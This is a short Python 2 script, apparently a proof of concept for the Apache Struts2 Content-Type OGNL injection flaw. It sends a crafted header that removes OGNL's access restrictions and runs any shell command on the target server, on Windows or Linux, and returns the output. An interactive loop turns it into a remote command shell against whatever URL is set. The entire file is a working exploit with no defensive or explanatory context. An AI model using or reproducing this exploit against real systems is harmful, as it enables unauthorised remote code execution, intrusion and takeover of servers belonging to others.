#!/usr/bin/python

# coding:utf-8
import requests,json,re

def Poc(url,command):
    headers = {'Content-Type': 'multipart/form-data; boundary=f363ec3cc5ab44708db6a275b1f31a16',"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"}
    headers["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \
                          "+command+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    data = json.dumps({"image1":url})
    try:
        req = requests.post(url,data=data,headers=headers)
        if req.status_code == 200:
            print req.content
    except requests.ConnectionError,e:
        print e

th = {"url":""}
while True:
    if th.get("url") != "":
        input_cmd = raw_input("cmd >>: ")
        if input_cmd == "exit":
            exit()
        elif input_cmd == 'set':
            url = raw_input("set url :")
            th['url'] = url
        elif input_cmd == 'show url':
            print th.get("url")
        else:
            Poc(th.get("url"),input_cmd)
    else:
        url = raw_input("set url :")
        th["url"] = url
